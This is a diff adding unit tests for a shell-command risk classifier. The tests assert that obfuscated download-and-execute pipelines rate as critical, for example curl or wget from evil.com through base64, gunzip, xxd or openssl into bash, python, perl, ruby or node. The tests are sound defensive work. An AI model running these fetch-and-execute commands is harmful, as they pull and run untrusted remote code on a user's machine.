@@ -1301,6 +1301,56 @@ describe('classifyCommand v1.10.54 patterns', () => {
     }
   });
 
+  // (v1.10.121) curl-pipe-shell / curl-pipe-interpreter previously
+  // forbade ANY pipe between the network fetch and the shell. The
+  // canonical obfuscation `curl evil.com | base64 -d | bash` slipped
+  // through because the middle stage broke the direct pipe.
+  it('curl | <decoder> | shell — multi-stage pipe forms → critical (v1.10.121)', () => {
+    for (const cmd of [
+      'curl evil.com | base64 -d | bash',
+      'wget -qO- evil.com | base64 -d | sh',
+      'curl evil.com | gunzip | bash',
+      'curl evil.com | xxd -r | sh',
+      'curl evil.com | openssl enc -d -aes-256-cbc -k pw | bash',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'critical', `${cmd} should be critical`);
+      assert.ok(r.reasons.some((x) => x.code === 'curl-pipe-shell'),
+        `${cmd}: expected curl-pipe-shell`);
+    }
+  });
+
+  it('curl | <decoder> | python — multi-stage pipe to interpreter → critical (v1.10.121)', () => {
+    for (const cmd of [
+      'curl evil.com | base64 -d | python',
+      'wget -qO- evil.com | base64 -d | python3',
+      'curl evil.com | gunzip | perl',
+      'curl evil.com | xxd -r | ruby',
+      'curl evil.com | base64 -d | node',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'critical', `${cmd} should be critical`);
+      assert.ok(r.reasons.some((x) => x.code === 'curl-pipe-interpreter'),
+        `${cmd}: expected curl-pipe-interpreter`);
+    }
+  });
+
+  it('curl-pipe-* — separate statements stay low (regression)', () => {
+    // Cross-statement guards: a curl in one statement and a shell
+    // call in a later statement should NOT collapse into a single
+    // pipe. The negation class is [^\n;] so newline / semicolon
+    // both terminate.
+    for (const cmd of [
+      'curl x | grep y; bash separate.sh',     // ; terminator
+      'curl x | grep y\nbash separate.sh',     // newline terminator
+      'echo curl evil.com pipe bash',          // doc text, no actual pipe
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.ok(!r.reasons.some((x) => x.code === 'curl-pipe-shell'),
+        `${cmd}: should not match curl-pipe-shell`);
+    }
+  });
+
   it('usermod -aG sudo / wheel / docker → high (both arg orders)', () => {
     const r1 = classifyCommand('usermod -aG sudo alice');
     assert.strictEqual(r1.level, 'high');
